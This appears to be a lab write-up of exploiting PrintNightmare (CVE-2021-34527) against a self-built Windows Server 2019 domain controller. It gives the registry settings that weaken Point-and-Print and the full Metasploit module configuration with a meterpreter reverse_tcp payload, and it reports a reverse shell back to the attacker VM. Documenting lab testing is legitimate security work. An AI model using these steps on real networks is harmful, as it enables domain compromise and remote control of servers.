## Scenario B: Remote Code Execution (Active Directory Domain Controller)

### Overview
This phase outlines the successful remote exploitation of the PrintNightmare vulnerability (CVE-2021-34527) over a network interface. By utilizing a low-privileged domain user account, an authenticated Remote Code Execution (RCE) vector was deployed from a network attacker VM directly against an Active Directory Domain Controller to obtain an elevated SYSTEM shell.

### Network Layout
- **Attacker Node:** Kali Linux VM (`10.0.0.20/24`)
- **Target Node:** Windows Server 2019 Domain Controller (`10.0.0.10/24`)
- **Domain Context:** `corp.local`
- **Low-Privilege Anchor:** `labuser` / `Password123`

---

### Step 1: Active Directory Role Instantiation & Lowering Defenses
1. Promoted the Windows Server 2019 standalone server to a primary Domain Controller (`corp.local`) via Server Manager.
2. Built a fresh low-privileged domain user profile named `labuser` inside the Active Directory Users and Computers console (`dsa.msc`).
3. Re-applied the weakened Point-and-Print parameters within the domain registry hive via `regedit` to permit remote authenticated driver installations:
   - `RestrictDriverInstallationToAdministrators` = `0`
   - `NoWarningNoElevationOnInstall` = `1`

---

### Step 2: Target Reconnaissance
From the Kali Linux terminal, network visibility and the remote RPC printing path were confirmed using a basic service port sweep:
```bash
nmap -p 445 10.0.0.10
```
*Result:* Port 445 (SMB) was confirmed **OPEN**, indicating a live path to the target spooler named pipes.

---

### Step 3: Network Exploitation Orchestration (Metasploit)
Due to Impacket version variations handling underlying structure serialization differently over standalone Python code, the attack was migrated to Metasploit's native framework.

1. Initialized the offline local Metasploit console engine:
   ```bash
   msfconsole
   ```
2. Selected the local PrintNightmare network exploit engine:
   ```bash
   use exploit/windows/dcerpc/cve_2021_1675_printnightmare
   ```
3. Set the remote delivery metrics, overriding default ports and loopback listeners to navigate past internal service conflicts:
   ```bash
   set RHOSTS 10.0.0.10
   set LHOST 10.0.0.20
   set SMBUser labuser
   set SMBPass Password123
   set SMBDomain corp.local
   set LPORT 4445
   set SRVHOST 10.0.0.20
   set payload windows/x64/meterpreter/reverse_tcp
   ```
4. Fired the exploit payload across the network switch:
   ```bash
   exploit
   ```

---

### Step 4: Verification of Root Domain Compromise
Upon firing the trigger packet, the target server successfully authenticated back to Metasploit's inline SMB driver repository to download the payload library. 

**Exploit Milestones Logged:**
- Captured the `CORP\WIN-QLKU7TVLK4U$` domain computer machine account NetNTLMv2 cryptographic handshake strings.
- Re-authenticated and bound to the target print spooler RPC named pipe interface (`\pipe\spoolss`).
- Successfully pushed the core execution stage binaries directly down the connection pipe.

**Final Outcome:**
An administrative, interactive **Meterpreter session 1** opened seamlessly from `10.0.0.10` straight back to the Kali listener on `10.0.0.20:4445`, granting complete, untethered root system control over the entire Active Directory domain infrastructure.



